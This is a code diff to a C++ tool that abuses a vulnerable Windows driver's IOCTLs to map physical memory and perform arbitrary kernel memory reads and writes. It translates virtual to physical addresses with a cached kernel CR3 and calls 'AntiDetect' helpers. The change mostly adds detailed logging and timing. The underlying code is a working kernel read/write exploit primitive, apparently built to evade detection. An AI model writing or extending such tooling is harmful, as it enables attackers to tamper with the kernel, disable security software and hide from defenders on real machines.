@@ -34,6 +34,15 @@ static void VDbgLog(const char* func, const char* fmt, ...) {
 #define VLOG(fmt, ...) VDbgLog(__FUNCTION__, fmt, ##__VA_ARGS__)
 #define VLOG_STATUS(msg, st) VDbgLog(__FUNCTION__, "%s: 0x%08X (%s)", msg, (DWORD)(st), NT_SUCCESS(st) ? "SUCCESS" : "FAILED")
 
+static ULONGLONG VElapsedMs(ULONGLONG start) {
+    ULONGLONG now = GetTickCount64();
+    return now >= start ? now - start : 0;
+}
+
+static ULONG VBuildNumber() {
+    return *reinterpret_cast<volatile ULONG*>(static_cast<ULONG_PTR>(0x7FFE0260)) & 0xFFFFu;
+}
+
 DEFINE_GUID(GUID_DEVINTERFACE_GIO,
     0x70a35746, 0x5d4c, 0x4d58, 0xb6, 0xc5, 0xc6, 0xef, 0x26, 0xf6, 0x4e, 0x7e);
 
@@ -263,16 +272,40 @@ namespace VulnDriver {
     }
 
     NTSTATUS MapPhysicalMemory(HANDLE device, ULONGLONG physAddr, ULONG size, PVOID* mappedAddr) {
+        const ULONGLONG start = GetTickCount64();
+        VLOG("MapPhysicalMemory enter device=%p phys=0x%llX size=0x%X out=%p pid=%lu tid=%lu build=%lu max_phys=0x%llX",
+            device,
+            physAddr,
+            size,
+            mappedAddr,
+            GetCurrentProcessId(),
+            GetCurrentThreadId(),
+            VBuildNumber(),
+            g_MaxPhysAddr);
 
         if (device == nullptr || device == INVALID_HANDLE_VALUE) {
+            VLOG("MapPhysicalMemory reject invalid_handle device=%p phys=0x%llX size=0x%X elapsed_ms=%llu",
+                device,
+                physAddr,
+                size,
+                VElapsedMs(start));
             return STATUS_INVALID_HANDLE;
         }
         if (!mappedAddr || size == 0) {
+            VLOG("MapPhysicalMemory reject invalid_parameter out=%p size=0x%X phys=0x%llX elapsed_ms=%llu",
+                mappedAddr,
+                size,
+                physAddr,
+                VElapsedMs(start));
             return STATUS_INVALID_PARAMETER;
         }
 
-        // Safety: reject physical addresses outside known RAM range
         if (g_MaxPhysAddr != 0 && physAddr >= g_MaxPhysAddr) {
+            VLOG("MapPhysicalMemory reject phys_out_of_range phys=0x%llX max=0x%llX size=0x%X elapsed_ms=%llu",
+                physAddr,
+                g_MaxPhysAddr,
+                size,
+                VElapsedMs(start));
             return STATUS_INVALID_PARAMETER;
         }
 
@@ -297,10 +330,25 @@ namespace VulnDriver {
             &ioData,
             sizeof(ioData)
         );
+        VLOG("MapPhysicalMemory ioctl_return status=0x%08X io_status=0x%08X info=%llu phys=0x%llX size=0x%X mapped=%p section=%p section_object=%p elapsed_ms=%llu",
+            (DWORD)status,
+            (DWORD)ioStatus.Status,
+            static_cast<unsigned long long>(ioStatus.Information),
+            physAddr,
+            size,
+            ioData.MappedAddress,
+            ioData.SectionHandle,
+            ioData.SectionObject,
+            VElapsedMs(start));
 
         if (NT_SUCCESS(status) && ioData.MappedAddress != nullptr) {
             *mappedAddr = ioData.MappedAddress;
             CacheMapResult(ioData);
+            VLOG("MapPhysicalMemory success phys=0x%llX size=0x%X mapped=%p elapsed_ms=%llu",
+                physAddr,
+                size,
+                *mappedAddr,
+                VElapsedMs(start));
         } else {
             if (NT_SUCCESS(status)) {
                 VLOG("MapPhysicalMemory: IOCTL succeeded but MappedAddress is NULL! phys=0x%llX size=0x%X",
@@ -316,11 +364,24 @@ namespace VulnDriver {
     }
 
     NTSTATUS UnmapPhysicalMemory(HANDLE device, PVOID mappedAddr) {
+        const ULONGLONG start = GetTickCount64();
+        VLOG("UnmapPhysicalMemory enter device=%p mapped=%p pid=%lu tid=%lu",
+            device,
+            mappedAddr,
+            GetCurrentProcessId(),
+            GetCurrentThreadId());
 
         if (device == nullptr || device == INVALID_HANDLE_VALUE) {
+            VLOG("UnmapPhysicalMemory reject invalid_handle device=%p mapped=%p elapsed_ms=%llu",
+                device,
+                mappedAddr,
+                VElapsedMs(start));
             return STATUS_INVALID_HANDLE;
         }
         if (!mappedAddr) {
+            VLOG("UnmapPhysicalMemory reject invalid_parameter mapped=%p elapsed_ms=%llu",
+                mappedAddr,
+                VElapsedMs(start));
             return STATUS_INVALID_PARAMETER;
         }
 
@@ -354,12 +415,33 @@ namespace VulnDriver {
         );
 
         RemoveCachedMap(mappedAddr);
+        VLOG("UnmapPhysicalMemory exit status=0x%08X io_status=0x%08X info=%llu mapped=%p cached=%u phys=0x%llX size=0x%llX elapsed_ms=%llu",
+            (DWORD)status,
+            (DWORD)ioStatus.Status,
+            static_cast<unsigned long long>(ioStatus.Information),
+            mappedAddr,
+            cached ? 1u : 0u,
+            static_cast<unsigned long long>(ioData.PhysicalAddress.QuadPart),
+            static_cast<unsigned long long>(ioData.Size.QuadPart),
+            VElapsedMs(start));
 
         return status;
     }
 
     NTSTATUS ReadPhysicalMemory(HANDLE device, ULONGLONG physAddr, PVOID buffer, SIZE_T size) {
+        const ULONGLONG start = GetTickCount64();
+        VLOG("ReadPhysicalMemory enter device=%p phys=0x%llX buffer=%p size=0x%llX pid=%lu tid=%lu",
+            device,
+            physAddr,
+            buffer,
+            static_cast<unsigned long long>(size),
+            GetCurrentProcessId(),
+            GetCurrentThreadId());
         if (!buffer || size == 0) {
+            VLOG("ReadPhysicalMemory reject invalid_parameter buffer=%p size=0x%llX elapsed_ms=%llu",
+                buffer,
+                static_cast<unsigned long long>(size),
+                VElapsedMs(start));
             return STATUS_INVALID_PARAMETER;
         }
 
@@ -379,16 +461,42 @@ namespace VulnDriver {
             AntiDetect::MemoryBarrier();
         }
         __except (EXCEPTION_EXECUTE_HANDLER) {
+            DWORD code = GetExceptionCode();
             UnmapPhysicalMemory(device, mapped);
+            VLOG("ReadPhysicalMemory exception code=0x%08X phys=0x%llX mapped=%p size=0x%llX elapsed_ms=%llu",
+                code,
+                physAddr,
+                mapped,
+                static_cast<unsigned long long>(size),
+                VElapsedMs(start));
             return STATUS_ACCESS_VIOLATION;
         }
 
-        UnmapPhysicalMemory(device, mapped);
+        NTSTATUS unmapStatus = UnmapPhysicalMemory(device, mapped);
+        VLOG("ReadPhysicalMemory exit status=0x%08X unmap_status=0x%08X phys=0x%llX mapped=%p size=0x%llX elapsed_ms=%llu",
+            (DWORD)STATUS_SUCCESS,
+            (DWORD)unmapStatus,
+            physAddr,
+            mapped,
+            static_cast<unsigned long long>(size),
+            VElapsedMs(start));
         return STATUS_SUCCESS;
     }
 
     NTSTATUS WritePhysicalMemory(HANDLE device, ULONGLONG physAddr, PVOID data, SIZE_T size) {
+        const ULONGLONG start = GetTickCount64();
+        VLOG("WritePhysicalMemory enter device=%p phys=0x%llX data=%p size=0x%llX pid=%lu tid=%lu",
+            device,
+            physAddr,
+            data,
+            static_cast<unsigned long long>(size),
+            GetCurrentProcessId(),
+            GetCurrentThreadId());
         if (!data || size == 0) {
+            VLOG("WritePhysicalMemory reject invalid_parameter data=%p size=0x%llX elapsed_ms=%llu",
+                data,
+                static_cast<unsigned long long>(size),
+                VElapsedMs(start));
             return STATUS_INVALID_PARAMETER;
         }
 
@@ -408,11 +516,25 @@ namespace VulnDriver {
             AntiDetect::MemoryBarrier();
         }
         __except (EXCEPTION_EXECUTE_HANDLER) {
+            DWORD code = GetExceptionCode();
             UnmapPhysicalMemory(device, mapped);
+            VLOG("WritePhysicalMemory exception code=0x%08X phys=0x%llX mapped=%p size=0x%llX elapsed_ms=%llu",
+                code,
+                physAddr,
+                mapped,
+                static_cast<unsigned long long>(size),
+                VElapsedMs(start));
             return STATUS_ACCESS_VIOLATION;
         }
 
-        UnmapPhysicalMemory(device, mapped);
+        NTSTATUS unmapStatus = UnmapPhysicalMemory(device, mapped);
+        VLOG("WritePhysicalMemory exit status=0x%08X unmap_status=0x%08X phys=0x%llX mapped=%p size=0x%llX elapsed_ms=%llu",
+            (DWORD)STATUS_SUCCESS,
+            (DWORD)unmapStatus,
+            physAddr,
+            mapped,
+            static_cast<unsigned long long>(size),
+            VElapsedMs(start));
         return STATUS_SUCCESS;
     }
 
@@ -690,32 +812,58 @@ namespace VulnDriver {
     }
 
     NTSTATUS ReadKernelMemory(HANDLE device, PVOID address, PVOID buffer, SIZE_T size) {
+        const ULONGLONG readStartTick = GetTickCount64();
+        VLOG("ReadKernelMemory ENTER device=%p address=%p buffer=%p size=0x%llX pid=%lu tid=%lu build=%lu cached_cr3=0x%llX nt_base=0x%llX",
+            device,
+            address,
+            buffer,
+            static_cast<unsigned long long>(size),
+            GetCurrentProcessId(),
+            GetCurrentThreadId(),
+            VBuildNumber(),
+            static_cast<unsigned long long>(g_KernelCR3),
+            static_cast<unsigned long long>(g_NtoskrnlBase));
         if (device == nullptr || device == INVALID_HANDLE_VALUE) {
             VLOG("ReadKernelMemory: INVALID DEVICE HANDLE");
             return STATUS_INVALID_HANDLE;
         }
         if (!buffer || size == 0) {
+            VLOG("ReadKernelMemory: INVALID PARAMETER buffer=%p size=0x%llX",
+                buffer,
+                static_cast<unsigned long long>(size));
             return STATUS_INVALID_PARAMETER;
         }
 
         ULONGLONG va = reinterpret_cast<ULONGLONG>(address);
         PUCHAR outBuf = static_cast<PUCHAR>(buffer);
         SIZE_T remaining = size;
+        SIZE_T chunkCount = 0;
 
         while (remaining > 0) {
             ULONGLONG pageOffset = va & 0xFFF;
             SIZE_T chunkSize = min(remaining, 0x1000 - static_cast<SIZE_T>(pageOffset));
+            chunkCount++;
 
             ULONGLONG physAddr = VirtualToPhysical(device, reinterpret_cast<PVOID>(va));
             if (physAddr == 0) {
-                VLOG("ReadKernelMemory: VA->PA translation failed for VA=0x%llX", va);
+                VLOG("ReadKernelMemory: VA->PA translation failed for VA=0x%llX chunks=%llu cached_cr3=0x%llX nt_base=0x%llX elapsed_ms=%llu",
+                    va,
+                    static_cast<unsigned long long>(chunkCount),
+                    static_cast<unsigned long long>(g_KernelCR3),
+                    static_cast<unsigned long long>(g_NtoskrnlBase),
+                    static_cast<unsigned long long>(GetTickCount64() - readStartTick));
                 return STATUS_UNSUCCESSFUL;
             }
 
             NTSTATUS status = ReadPhysicalMemory(device, physAddr, outBuf, chunkSize);
             if (!NT_SUCCESS(status)) {
-                VLOG("ReadKernelMemory: ReadPhysicalMemory failed, VA=0x%llX PA=0x%llX status=0x%08X",
-                     va, physAddr, (DWORD)status);
+                VLOG("ReadKernelMemory: ReadPhysicalMemory failed, VA=0x%llX PA=0x%llX chunk=0x%llX chunks=%llu status=0x%08X elapsed_ms=%llu",
+                     va,
+                     physAddr,
+                     static_cast<unsigned long long>(chunkSize),
+                     static_cast<unsigned long long>(chunkCount),
+                     (DWORD)status,
+                     static_cast<unsigned long long>(GetTickCount64() - readStartTick));
                 return status;
             }
 
@@ -724,36 +872,70 @@ namespace VulnDriver {
             remaining -= chunkSize;
         }
 
+        VLOG("ReadKernelMemory EXIT status=0x%08X address=%p size=0x%llX chunks=%llu cached_cr3=0x%llX nt_base=0x%llX elapsed_ms=%llu",
+            static_cast<DWORD>(STATUS_SUCCESS),
+            address,
+            static_cast<unsigned long long>(size),
+            static_cast<unsigned long long>(chunkCount),
+            static_cast<unsigned long long>(g_KernelCR3),
+            static_cast<unsigned long long>(g_NtoskrnlBase),
+            static_cast<unsigned long long>(GetTickCount64() - readStartTick));
         return STATUS_SUCCESS;
     }
 
     NTSTATUS WriteKernelMemory(HANDLE device, PVOID address, PVOID data, SIZE_T size) {
+        const ULONGLONG writeStartTick = GetTickCount64();
+        VLOG("WriteKernelMemory ENTER device=%p address=%p data=%p size=0x%llX pid=%lu tid=%lu build=%lu cached_cr3=0x%llX nt_base=0x%llX",
+            device,
+            address,
+            data,
+            static_cast<unsigned long long>(size),
+            GetCurrentProcessId(),
+            GetCurrentThreadId(),
+            VBuildNumber(),
+            static_cast<unsigned long long>(g_KernelCR3),
+            static_cast<unsigned long long>(g_NtoskrnlBase));
         if (device == nullptr || device == INVALID_HANDLE_VALUE) {
             VLOG("WriteKernelMemory: INVALID DEVICE HANDLE");
             return STATUS_INVALID_HANDLE;
         }
         if (!data || size == 0) {
+            VLOG("WriteKernelMemory: INVALID PARAMETER data=%p size=0x%llX",
+                data,
+                static_cast<unsigned long long>(size));
             return STATUS_INVALID_PARAMETER;
         }
 
         ULONGLONG va = reinterpret_cast<ULONGLONG>(address);
         PUCHAR inBuf = static_cast<PUCHAR>(data);
         SIZE_T remaining = size;
+        SIZE_T chunkCount = 0;
 
         while (remaining > 0) {
             ULONGLONG pageOffset = va & 0xFFF;
             SIZE_T chunkSize = min(remaining, 0x1000 - static_cast<SIZE_T>(pageOffset));
+            chunkCount++;
 
             ULONGLONG physAddr = VirtualToPhysical(device, reinterpret_cast<PVOID>(va));
             if (physAddr == 0) {
-                VLOG("WriteKernelMemory: VA->PA translation failed for VA=0x%llX", va);
+                VLOG("WriteKernelMemory: VA->PA translation failed for VA=0x%llX chunks=%llu cached_cr3=0x%llX nt_base=0x%llX elapsed_ms=%llu",
+                    va,
+                    static_cast<unsigned long long>(chunkCount),
+                    static_cast<unsigned long long>(g_KernelCR3),
+                    static_cast<unsigned long long>(g_NtoskrnlBase),
+                    static_cast<unsigned long long>(GetTickCount64() - writeStartTick));
                 return STATUS_UNSUCCESSFUL;
             }
 
             NTSTATUS status = WritePhysicalMemory(device, physAddr, inBuf, chunkSize);
             if (!NT_SUCCESS(status)) {
-                VLOG("WriteKernelMemory: WritePhysicalMemory failed, VA=0x%llX PA=0x%llX status=0x%08X",
-                     va, physAddr, (DWORD)status);
+                VLOG("WriteKernelMemory: WritePhysicalMemory failed, VA=0x%llX PA=0x%llX chunk=0x%llX chunks=%llu status=0x%08X elapsed_ms=%llu",
+                     va,
+                     physAddr,
+                     static_cast<unsigned long long>(chunkSize),
+                     static_cast<unsigned long long>(chunkCount),
+                     (DWORD)status,
+                     static_cast<unsigned long long>(GetTickCount64() - writeStartTick));
                 return status;
             }
 
@@ -762,6 +944,14 @@ namespace VulnDriver {
             remaining -= chunkSize;
         }
 
+        VLOG("WriteKernelMemory EXIT status=0x%08X address=%p size=0x%llX chunks=%llu cached_cr3=0x%llX nt_base=0x%llX elapsed_ms=%llu",
+            static_cast<DWORD>(STATUS_SUCCESS),
+            address,
+            static_cast<unsigned long long>(size),
+            static_cast<unsigned long long>(chunkCount),
+            static_cast<unsigned long long>(g_KernelCR3),
+            static_cast<unsigned long long>(g_NtoskrnlBase),
+            static_cast<unsigned long long>(GetTickCount64() - writeStartTick));
         return STATUS_SUCCESS;
     }
 
